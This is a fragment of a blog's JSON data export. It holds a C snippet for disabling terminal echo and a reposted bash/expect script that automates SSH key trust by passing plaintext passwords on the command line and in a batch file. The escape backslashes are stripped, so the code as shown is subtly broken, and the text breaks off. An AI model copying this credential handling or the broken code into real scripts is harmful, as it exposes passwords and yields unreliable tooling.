-1;\n}\nreturn 0;\n}\nstatic int terminal_echo_on(int fd)\n{\nstruct termios term;\nif (isatty(fd) == 0)\n{\n#ifdef DEBUG\nprintf(\"the file %i is not a terminaln\", fd);\n#endif /* DEBUG */\nreturn -1;\n}\nif (tcgetattr(fd, &term) < 0)\n{\n#ifdef DEBUG\nperror(\"tcgetattr: \");\n#endif /* DEBUG */\nreturn -1;\n}\nterm.c_lflag |= ECHO;\nif (tcsetattr(fd, TCSANOW, &term) < 0)\n{\n#ifdef DEBUG\nperror(\"tcsetattr: \");\n#endif /* DEBUG */\nreturn -1;\n}\nreturn 0;\n}\n</pre>","site":{"data":{}},"excerpt":"","more":"<p>在读ptrunnel的代码时，发现一个很好的用法记录一下，可用于密码的输入框，不回显输入内容，可用于很多场景。<br>代码如下：</p>\n<pre>\nstatic int terminal_echo_off(int fd)\n{\nstruct termios term;\nif (isatty(fd) == 0)\n{\n#ifdef DEBUG\nprintf(\"the file %i is not a terminaln\", fd);\n#endif /* DEBUG */\nreturn -1;\n}\nif (tcgetattr(fd, &term) < 0)\n{\n#ifdef DEBUG\nperror(\"tcgetattr: \");\n#endif /* DEBUG */\nreturn -1;\n}\nterm.c_lflag &= ~ECHO;\nif (tcsetattr(fd, TCSANOW, &term) < 0)\n{\n#ifdef DEBUG\nperror(\"tcsetattr: \");\n#endif /* DEBUG */\nreturn -1;\n}\nreturn 0;\n}\nstatic int terminal_echo_on(int fd)\n{\nstruct termios term;\nif (isatty(fd) == 0)\n{\n#ifdef DEBUG\nprintf(\"the file %i is not a terminaln\", fd);\n#endif /* DEBUG */\nreturn -1;\n}\nif (tcgetattr(fd, &term) < 0)\n{\n#ifdef DEBUG\nperror(\"tcgetattr: \");\n#endif /* DEBUG */\nreturn -1;\n}\nterm.c_lflag |= ECHO;\nif (tcsetattr(fd, TCSANOW, &term) < 0)\n{\n#ifdef DEBUG\nperror(\"tcsetattr: \");\n#endif /* DEBUG */\nreturn -1;\n}\nreturn 0;\n}\n</pre>"},{"title":"自动建立ssh信任脚本","date":"2011-12-01T02:22:00.000Z","_content":"<p>转自：www.chinaunix.net。作者：老表</p><p>&nbsp;</p><p>在工作中经常遇到给两台主机建立ssh信任，手动建立太费事了，索性胡乱写了个脚本ssh_trust.sh来自动建立信任：</p><ol><li>#!/bin/bash<br /></li><li>src_host=$1<br /></li><li>src_username=$2<br /></li><li>src_passwd=$3<br /></li><li><br /></li><li>dst_host=$4<br /></li><li>dst_username=$5<br /></li><li>dst_passwd=$6<br /></li><li><br /></li><li>#在远程主机1上生成公私钥对<br /></li><li>Keygen()<br /></li><li>{<br /></li><li>expect &lt;&lt; EOF<br /></li><li><br /></li><li>spawn ssh $src_username@$src_host ssh-keygen -t rsa<br /></li><li>while 1 {<br /></li><li><br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;expect {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;password:&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;$src_passwdn&quot;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;yes/no*&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;yesn&quot;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;Enter file in which to save the key*&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;n&quot;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;Enter passphrase*&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;n&quot;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;Enter same passphrase again:&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;n&quot;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }<br /></li><li><br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;Overwrite (y/n)&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;nn&quot;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;eof {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;exit<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}<br /></li><li><br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}<br /></li><li>}<br /></li><li>EOF<br /></li><li>}<br /></li><li><br /></li><li>#从远程主机1获取公钥保存到本地<br /></li><li>Get_pub()<br /></li><li>{<br /></li><li>expect &lt;&lt; EOF<br /></li><li><br /></li><li>spawn scp $src_username@$src_host:~/.ssh/id_rsa.pub /tmp<br /></li><li>expect {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; &quot;password:&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;$src_passwdn&quot;;exp_continue<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; &quot;yes/no*&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;yesn&quot;;exp_continue<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }&nbsp; &nbsp;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; eof {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;exit<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }<br /></li><li>}<br /></li><li>EOF<br /></li><li>}<br /></li><li>#将公钥的内容附加到远程主机2的authorized_keys<br /></li><li>Put_pub()<br /></li><li>{<br /></li><li>src_pub=&quot;$(cat /tmp/id_rsa.pub)&quot;<br /></li><li>expect &lt;&lt; EOF<br /></li><li>spawn ssh $dst_username@$dst_host &quot;chmod 700 ~/.ssh;echo $src_pub &gt;&gt; ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_ke<br /></li><li>ys&quot;<br /></li><li>expect {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;password:&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;send &quot;$dst_passwdn&quot;;exp_continue<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;yes/no*&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;send &quot;yesn&quot;;exp_continue<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }&nbsp; &nbsp;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;eof {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;exit<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; } <br /></li><li>}<br /></li><li>EOF<br /></li><li>}<br /></li><li>Keygen<br /></li><li>Get_pub<br /></li><li>Put_pub</li></ol><em></em>脚本主要由3个expect组成，比较简单，用法是<ol><li>./ssh_trust.sh host1 user1 passwd1 host2 user2 passwd2</li></ol><em></em>即建立从user1@host1到user2@host2的ssh信任。<br />说明：<br />1、当然得安装expect<br />2、脚本放在第三方机器（能远程登录host1和host2）上运行即可，当然放在host1和host2上运行也行。<br />3、如果想批量建立信任，可以编辑一个文件夹file如：<ol><li>host1 user1 passwd1 host2 user2 passwd2<br /></li><li>host3 user3 passwd3 host4 user4 passwd4<br /></li><li>host5 user5 passwd5 host6 user6 passwd6</li></ol><em></em>使用下面命令执行脚本即可：<ol><li>xargs -n6 ./ssh_trust.sh &lt; file</li></ol><em></em>4、仓促写的，脚本只是简单实现功能，使用前确保参数的可用性（用户密码主机名），不然很容易报错<br />5、只在linuxredhat上测试过，运行成功，欢迎大家提意见~~","source":"_posts/自动建立ssh信任脚本.md","raw":"title: 自动建立ssh信任脚本\ncategories: [Linux,Shell编程]\ntags: []\ndate: 2011-12-01 10:22:00\n---\n<p>转自：www.chinaunix.net。作者：老表</p><p>&nbsp;</p><p>在工作中经常遇到给两台主机建立ssh信任，手动建立太费事了，索性胡乱写了个脚本ssh_trust.sh来自动建立信任：</p><ol><li>#!/bin/bash<br /></li><li>src_host=$1<br /></li><li>src_username=$2<br /></li><li>src_passwd=$3<br /></li><li><br /></li><li>dst_host=$4<br /></li><li>dst_username=$5<br /></li><li>dst_passwd=$6<br /></li><li><br /></li><li>#在远程主机1上生成公私钥对<br /></li><li>Keygen()<br /></li><li>{<br /></li><li>expect &lt;&lt; EOF<br /></li><li><br /></li><li>spawn ssh $src_username@$src_host ssh-keygen -t rsa<br /></li><li>while 1 {<br /></li><li><br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;expect {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;password:&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;$src_passwdn&quot;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;yes/no*&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;yesn&quot;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;Enter file in which to save the key*&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;n&quot;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;Enter passphrase*&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;n&quot;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;Enter same passphrase again:&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;n&quot;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }<br /></li><li><br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;Overwrite (y/n)&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;nn&quot;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;eof {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;exit<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}<br /></li><li><br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;}<br /></li><li>}<br /></li><li>EOF<br /></li><li>}<br /></li><li><br /></li><li>#从远程主机1获取公钥保存到本地<br /></li><li>Get_pub()<br /></li><li>{<br /></li><li>expect &lt;&lt; EOF<br /></li><li><br /></li><li>spawn scp $src_username@$src_host:~/.ssh/id_rsa.pub /tmp<br /></li><li>expect {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; &quot;password:&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;$src_passwdn&quot;;exp_continue<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; &quot;yes/no*&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;yesn&quot;;exp_continue<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }&nbsp; &nbsp;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; eof {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;exit<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }<br /></li><li>}<br /></li><li>EOF<br /></li><li>}<br /></li><li>#将公钥的内容附加到远程主机2的authorized_keys<br /></li><li>Put_pub()<br /></li><li>{<br /></li><li>src_pub=&quot;$(cat /tmp/id_rsa.pub)&quot;<br /></li><li>expect &lt;&lt; EOF<br /></li><li>spawn ssh $dst_username@$dst_host &quot;chmod 700 ~/.ssh;echo $src_pub &gt;&gt; ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_ke<br /></li><li>ys&quot;<br /></li><li>expect {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;password:&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;send &quot;$dst_passwdn&quot;;exp_continue<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;yes/no*&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;send &quot;yesn&quot;;exp_continue<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; }&nbsp; &nbsp;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;eof {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;exit<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; } <br /></li><li>}<br /></li><li>EOF<br /></li><li>}<br /></li><li>Keygen<br /></li><li>Get_pub<br /></li><li>Put_pub</li></ol><em></em>脚本主要由3个expect组成，比较简单，用法是<ol><li>./ssh_trust.sh host1 user1 passwd1 host2 user2 passwd2</li></ol><em></em>即建立从user1@host1到user2@host2的ssh信任。<br />说明：<br />1、当然得安装expect<br />2、脚本放在第三方机器（能远程登录host1和host2）上运行即可，当然放在host1和host2上运行也行。<br />3、如果想批量建立信任，可以编辑一个文件夹file如：<ol><li>host1 user1 passwd1 host2 user2 passwd2<br /></li><li>host3 user3 passwd3 host4 user4 passwd4<br /></li><li>host5 user5 passwd5 host6 user6 passwd6</li></ol><em></em>使用下面命令执行脚本即可：<ol><li>xargs -n6 ./ssh_trust.sh &lt; file</li></ol><em></em>4、仓促写的，脚本只是简单实现功能，使用前确保参数的可用性（用户密码主机名），不然很容易报错<br />5、只在linuxredhat上测试过，运行成功，欢迎大家提意见~~","slug":"自动建立ssh信任脚本","published":1,"updated":"2023-04-22T05:38:45.148Z","_id":"clgrjlxmo00cp7opi5le857wi","comments":1,"layout":"post","photos":[],"link":"","content":"<p>转自：www.chinaunix.net。作者：老表</p><p>&nbsp;</p><p>在工作中经常遇到给两台主机建立ssh信任，手动建立太费事了，索性胡乱写了个脚本ssh_trust.sh来自动建立信任：</p><ol><li>#!/bin/bash<br /></li><li>src_host=$1<br /></li><li>src_username=$2<br /></li><li>src_passwd=$3<br /></li><li><br /></li><li>dst_host=$4<br /></li><li>dst_username=$5<br /></li><li>dst_passwd=$6<br /></li><li><br /></li><li>#在远程主机1上生成公私钥对<br /></li><li>Keygen()<br /></li><li>{<br /></li><li>expect &lt;&lt; EOF<br /></li><li><br /></li><li>spawn ssh $src_username@$src_host ssh-keygen -t rsa<br /></li><li>while 1 {<br /></li><li><br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;expect {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;password:&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;$src_passwdn&quot;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;yes/no*&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;yesn&quot;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;Enter file in which to save the key*&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;n&quot;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;Enter passphrase*&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; send &quot;n&quot;<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;}<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&quot;Enter same passphrase again:&quot; {<br /></li><li>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; 